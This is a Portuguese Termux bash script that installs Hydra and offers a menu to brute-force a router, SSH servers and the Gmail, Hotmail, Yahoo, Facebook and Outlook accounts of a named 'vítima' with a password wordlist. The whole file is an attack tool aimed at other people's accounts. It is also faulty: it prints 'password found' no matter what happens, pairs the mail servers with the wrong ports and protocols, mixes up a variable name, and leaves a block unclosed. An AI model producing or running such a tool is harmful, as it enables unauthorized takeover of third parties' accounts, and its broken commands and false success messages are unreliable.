#! /data/data/com.termux/files/usr/bin/bash
#
#
#Fazendo o programa dormir por 3 segundos
sleep 3
#
#Instalando o hydra
pkg install hydra
#
#
#Limpando a tela
clear
#
#
#
figlet Hydra
#
#MENU
echo "======================================"
echo "   \033[1;33m[\033[1;31m1]>> \033[1;33mINVADIR ROTEADOR \033[1;36m"
echo "   \033[1;33m[\033[1;31m2]>> \033[1;33mINVADIR GMAIL \033[1;36m"
echo "   \033[1;33m[\033[1;31m3]>> \033[1;33mINVADIR HOTMAIL \033[1;36m"
echo "   \033[1;33m[\033[1;31m4]>> \033[1;33mINVADIR YAHOO \033[1;36m"
echo "   \033[1;33m[\033[1;31m5]>> \033[1;33mINVADIR FACEBOOK \033[1;36m"
echo "   \033[1;33m[\033[1;31m6]>> \033[1;33mINVADIR OUTLOOK \033[1;36m"
echo "   \033[1;33m[\033[1;31m7]>> \033[1;33mINVADIR SSH \033[1;36m"
#
#Escolher entre 1,2,3,4 ou 5
#obrigado por 6usar!
read -p "[+]>>" opcao
#
#Invadir roteador
if [ "$opcao" = "1" ];then
echo "\033[1;36mINFORME O IP DO SEU ROTEADOR"; sleep 1
read -p "[+]=>" ip
echo
echo "\033[1;36mINFORME O USER DO SEU ROTEADOR"; sleep 1
read -p "[+]=>" user
echo
echo "\033[1;36mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; sleep 1
read -p "[+]=>" wordlist
echo 
 echo "\033[1;36mINVADINDO ROTEADOR..."; sleep 1
hydra -l $user -P $wordlist -V $ip http-get
fi
#Invadir Gmail
if [ "$opcao" = "2" ];then
echo
echo "\033[1;36mINFORME O EMAIL DA VÍTIMA"; sleep 1
read -p "[+]>>" email
echo
echo "\033[1;36mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; sleep 1
read -p "[+]>>" lista
echo
 echo "\033[1;36mCOMEÇANDO A INVASÃO..."; sleep 1
hydra -l $email -P $lista -s 465 smtp.gmail.com https-get
echo "\033[1;31mSENHA ENCONTRADA!"; sleep 1
fi
#Invadir HOTMAIL
if [ "$opcao" = "3" ];then
echo
echo "\033[1;36mINFORME O EMAIL DA VÍTIMA"; sleep 1
read -p "[+]>>" email
echo
echo "\033[1;36mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; sleep 2
read -p "[+]>>" lista
echo
 echo "\033[1;36mCOMEÇANDO A INVASÃO..."; sleep 1
hydra -l $email -P $lista -s 587 smtp.live.com https-get
echo "\033[1;36mSENHA ENCONTRADA!"; sleep 1
fi
#Invadir YAHOO
if [ "$opcao" = "4" ];then
echo
echo "\033[1;36mINFORME O EMAIL DA VÍTIMA"; sleep 1
read -p "[+]>>" email
echo
echo "\033[1;36mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; sleep 1
read -p "[+]>>" lista
echo
 echo "\033[1;36mCOMEÇANDO A INVASÃO..."; sleep 1
hydra -l $email -P $lista -s 465 smtp.mail.yahoo.com https-get
echo "\033[1;36mSENHA ENCONTRADA!"; sleep 1
fi
#Invadir FACEBOOK
if [ "$opcao" = "5" ];then
echo
echo "\033[1;36mINFORME O EMAIL DA VÍTIMA"; sleep 1
read -p "[+]>>" email
echo
echo "\033[1;36mINFORME O DIRETÓRIO DA SUA LISTA DESENHA"; sleep 1
read -p "[+]>>" lista
echo
 echo "\033[1;36mCOMEÇANDO A INVASÃO..."; sleep 1
hydra -l $email -P $lista -f www.facebook.com https-get
echo "\033[1;36mSENHA ENCONTRADA!"; sleep 3
fi
if [ "$opcao" = "6" ];then
echo
 echo "\033[1;36mINFORME O EMAIL A SER INVADIDO"; sleep 1
read -p "[+]>>" email
echo
echo "\033[1;36mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; sleep 1
read -p "[+]>>" lista
echo 
echo "\033[1;36mCOMEÇANDO A INVASÃO...!"; sleep 1
hydra -l $email -P $lista -s 25 smtp.outlook.com https-get
fi
if [ "$opcao" = "7" ];then
echo
 echo "\033[1;36mINFORME O IP DO SERVIDOR:"; sleep 1
read -p "[+]=>" ip
echo
  echo "\033[1;36mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; sleep 1
read -p "[+]=>" wordlist
echo
 echo "\033[1;36mINFORME O USER DO SERVIDOR SSH"; sleep 1
read -p "[+]=>" usr
echo
hydra -l $user -P $wordlist ssh://$ip
#
#Fazendo o programa dormir por 4 segundos
sleep 4
#
#Saindo do Script

exit

